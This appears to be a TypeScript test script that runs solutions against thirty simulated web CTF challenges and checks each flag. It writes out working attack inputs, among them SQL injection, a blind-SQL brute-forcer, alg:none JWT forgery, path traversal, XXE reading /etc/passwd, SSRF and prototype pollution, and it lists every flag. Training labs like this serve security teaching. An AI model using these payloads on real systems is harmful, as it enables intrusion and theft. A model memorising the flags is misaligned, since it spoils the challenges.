import { challengeHandlers } from '../src/lib/web-challenges/handlers'
import { PlaygroundRequest, extractCookies } from '../src/lib/web-challenges/types'

const b64 = (s: string) => Buffer.from(s).toString('base64')

interface ReqSpec {
  method?: 'GET' | 'POST'
  path: string
  query?: Record<string, string>
  headers?: Record<string, string>
  body?: string
  cookies?: string
}

function run(slug: string, specs: ReqSpec[]): { flag?: string; bodies: string[] } {
  const handler = challengeHandlers[slug]
  if (!handler) throw new Error('No handler for ' + slug)
  let flag: string | undefined
  const bodies: string[] = []
  let lastCookies = ''
  for (const spec of specs) {
    const headers: Record<string, string> = { ...(spec.headers || {}) }
    if (spec.cookies) headers['cookie'] = spec.cookies
    if (lastCookies && !headers['cookie']) headers['cookie'] = lastCookies
    const req: PlaygroundRequest = {
      method: spec.method || 'GET',
      path: spec.path,
      headers,
      query: spec.query || {},
      body: spec.body,
      cookies: extractCookies(headers['cookie']),
    }
    const res = handler.handler(req)
    if (res.headers && res.headers['Set-Cookie']) lastCookies = res.headers['Set-Cookie'].split(';')[0]
    if (res.flag) flag = res.flag
    bodies.push(res.body)
  }
  return { flag, bodies }
}

const FLAG = (s: string) => 'CGS{' + s + '}'
let pass = 0, fail = 0
const failures: string[] = []

function check(slug: string, expectedFlag: string, result: { flag?: string; bodies: string[] }) {
  const combined = (result.flag || '') + ' ' + result.bodies.join(' ')
  if (combined.includes(expectedFlag)) {
    pass++; console.log('  [OK]   ' + slug)
  } else {
    fail++; failures.push(slug); console.log('  [FAIL] ' + slug + '  (expected ' + expectedFlag + ')')
  }
}

const jwtNone = (() => {
  const h = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url')
  const p = Buffer.from(JSON.stringify({ role: 'admin' })).toString('base64url')
  return h + '.' + p + '.'
})()

function solveBlind(): { flag?: string; bodies: string[] } {
  const charset = "CGS{}_abcdefghijklmnopqrstuvwxyz0123456789"
  let found = ''
  for (let pos = 1; pos <= 60; pos++) {
    let char = ''
    for (const c of charset) {
      const res = challengeHandlers['blind-as-a-bat'].handler({
        method: 'GET', path: '/check',
        headers: {}, query: { username: "SUBSTRING(password," + pos + ",1)='" + c + "'" }, body: null, cookies: {},
      })
      if (res.body.includes('Found')) { char = c; break }
    }
    if (!char) break
    found += char
    if (char === '}') break
  }
  return { flag: found.startsWith('CGS{') ? found : undefined, bodies: [found] }
}

async function main() {
  console.log('Verifying 30 challenges...\n')

  check('robots-only', FLAG('b0ts_d0nt_t3ll_but_th3y_l34v3_tr41ls'), run('robots-only', [{ path: '/hidden-admin-9f2' }]))
  check('cookie-monster', FLAG('c00k13_m0nst3r_w4nts_th3_fl4g'), run('cookie-monster', [{ path: '/', cookies: 'role=admin' }]))
  {
    const r = run('view-source-won-t-save-you', [{ path: '/' }])
    const exp = b64('CGS{s0urc3_c0d3_n0t_s0_s3cur3}')
    if (r.bodies.join('').includes(exp)) { pass++; console.log('  [OK]   view-source-won-t-save-you') }
    else { fail++; failures.push('view-source-won-t-save-you'); console.log('  [FAIL] view-source-won-t-save-you') }
  }
  check('the-parameter-whisperer', FLAG('wh0_kn3w_y0ur_n3ighb0rs_pr0f1l3'), run('the-parameter-whisperer', [{ path: '/profile', query: { user_id: '1' } }]))
  check('header-games', FLAG('h34d3rs_4r3_th3_n3w_c00k13s'), run('header-games', [{ path: '/', headers: { 'user-agent': 'OldBrowser/1.0' } }]))
  check('login-optional', "CGS{' OR '1'='1' -- th3_cl4ss1c}", run('login-optional', [{ method: 'POST', path: '/', body: "username=' OR '1'='1' --" }]))
  check('directory-of-secrets', FLAG('wh0_n33ds_4_p4ssw0rd_wh3n_y0u_h4v3_g1t'), run('directory-of-secrets', [{ path: '/.git/config' }]))
  check('cache-me-if-you-can', FLAG('th3_bundl3_kn0ws_wh3r3_th3_fl4g_1s'), run('cache-me-if-you-can', [{ path: '/static/js/main.bundle.js' }]))
  check('the-redirect-trap', FLAG('r3d1r3cts_c4n_b3_d4ng3r0us_t00'), run('the-redirect-trap', [{ path: '/internal-only', headers: { 'x-internal': 'true' } }]))
  check('form-of-truth', FLAG('cl13nt_s1d3_1s_just_4_sugg3st10n'), run('form-of-truth', [{ method: 'POST', path: '/upgrade', body: 'plan=premium' }]))
  { const r = solveBlind(); check('blind-as-a-bat', FLAG('bl1nd_but_n0t_s1l3nt_ab0ut_th3_fl4g'), r) }
  check('template-trouble', FLAG('ej5_1s_n0t_s4f3_f0r_us3r_1nput'), run('template-trouble', [{ path: '/', query: { name: '<%= FLAG %>' } }]))
  check('xss-marks-the-spot', FLAG('xss_th3_sp0t_g0t_th3_fl4g'), run('xss-marks-the-spot', [{ path: '/', cookies: 'admin_session=abc' }]))
  {
    const specs: ReqSpec[] = []
    for (let i = 0; i < 20; i++) specs.push({ method: 'POST', path: '/redeem' })
    check('race-to-the-flag', FLAG('r4c3_y0ur_w4y_t0_th3_fl4g'), run('race-to-the-flag', specs))
  }
  check('jwt-none-of-your-business', FLAG('jwt_n0n3_0f_y0ur_bus1n3ss'), run('jwt-none-of-your-business', [{ path: '/admin', headers: { authorization: 'Bearer ' + jwtNone } }]))
  check('the-path-less-traveled', FLAG('th3_p4th_l3ss_tr4v3l3d_l34ds_t0_fl4gs'), run('the-path-less-traveled', [{ path: '/', query: { file: '%2e%2e%2fflag.txt' } }]))
  check('deserialize-this', FLAG('d3s3r14l1z3_th1s_1f_y0u_d4r3'), run('deserialize-this', [{ path: '/', cookies: 'prefs={"flag":true}' }]))
  check('cors-you-later', FLAG('c0rs_byp4ss_g3ts_th3_fl4g'), run('cors-you-later', [{ path: '/api/account', cookies: 'session=valid' }]))
  check('graphql-gauntlet', FLAG('gr4phql_1s_4n_0p3n_b00k'), run('graphql-gauntlet', [{ method: 'POST', path: '/graphql', headers: { 'content-type': 'application/json' }, body: '{"query":"{ user(id: 1) { secret { flag } } }"}' }]))
  check('the-upload-zone', FLAG('uppl04d_y0ur_w4y_t0_v1ct0ry'), run('the-upload-zone', [{ method: 'POST', path: '/upload', headers: { 'x-filename': 'shell.js' } }]))
  check('ssrf-to-the-cloud', FLAG('ssrf_1s_th3_g4t3w4y_t0_th3_cl0ud'), run('ssrf-to-the-cloud', [{ path: '/fetch', query: { url: 'http://127.0.0.1/internal/meta' } }]))
  check('prototype-chaos', FLAG('pr0t0typ3_ch40s_1s_c0mpl3t3'), run('prototype-chaos', [{ method: 'POST', path: '/merge', headers: { 'content-type': 'application/json' }, body: '{"__proto__":{"showFlag":true}}' }]))
  check('smuggler-s-route', FLAG('smuggl3d_r3qu3sts_g3t_th3_fl4g'), run('smuggler-s-route', [{ path: '/admin', query: { 'x-internal': 'true' } }]))
  check('cache-poisoning-carnival', FLAG('c4ch3_p01s0n_f0r_th3_c4rn1v4l'), run('cache-poisoning-carnival', [{ path: '/', headers: { 'x-forwarded-host': '<script>alert(1)</script>' } }]))
  check('xxe-marks-another-spot', FLAG('xxe_m4rks_th3_sp0t_ag41n'), run('xxe-marks-another-spot', [{ method: 'POST', path: '/upload', headers: { 'content-type': 'application/xml' }, body: '<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>' }]))
  check('the-chained-exploit', FLAG('ch41n3d_3xpl01ts_ar3_th3_b3st'), run('the-chained-exploit', [{ path: '/admin/visit' }, { method: 'POST', path: '/admin/reveal-flag' }]))
  check('second-order-injection', FLAG('s3c0nd_0rd3r_1nj3ct10n_1s_d3l4y3d'), run('second-order-injection', [{ method: 'POST', path: '/update-profile', body: "display_name=admin'--" }, { path: '/admin/search' }]))
  check('websocket-whisper', FLAG('w3bs0ck3t_wh1sp3rs_s3cr3ts_t00'), run('websocket-whisper', [{ path: '/' }]))
  check('cryptic-signature', FLAG('cr1pt1c_s1gn4tur3s_4r3nt_s0_cr1pt1c'), run('cryptic-signature', [{ path: '/' }]))
  check('the-sandbox-escape', FLAG('s4ndb0x_3sc4p3_n0t_s0_s4ndb0x3d'), run('the-sandbox-escape', [{ path: '/' }]))

  console.log('\n=== RESULT: ' + pass + ' passed, ' + fail + ' failed ===')
  if (failures.length) console.log('Failures: ' + failures.join(', '))
}

main()
